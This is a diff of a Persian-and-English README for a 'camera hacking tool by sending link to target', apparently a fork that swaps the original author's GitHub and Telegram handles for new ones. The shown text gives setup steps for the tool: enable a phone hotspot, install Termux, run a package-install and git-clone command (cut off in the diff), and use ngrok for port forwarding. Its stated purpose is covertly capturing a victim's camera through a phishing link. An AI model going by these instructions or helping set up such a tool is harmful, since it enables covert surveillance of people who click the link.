@@ -2,7 +2,7 @@
 ابزار هک دوربین با ارسال لینک به قربانی - Camera hacking tool by sending link to target
 
 
-1- https://github.com/HACKGM/cam/blob/master/on-hotspot.png نقطه اتصال گوشی رو روشن کنید
+1- https://github.com/ikalbod/cam/blob/master/on-hotspot.png نقطه اتصال گوشی رو روشن کنید
 
 2- Download termux ترموکس رو دانلود کنید
 
@@ -17,5 +17,5 @@ apt update && apt upgrade && pkg install wget php git openssl curl && git clone 
  ngrok
 رو بزنید برای پورت فراوردینگ
 
-canal telegram: http://t.me/hackgm
+telegram: http://t.me/a_kalbod
 
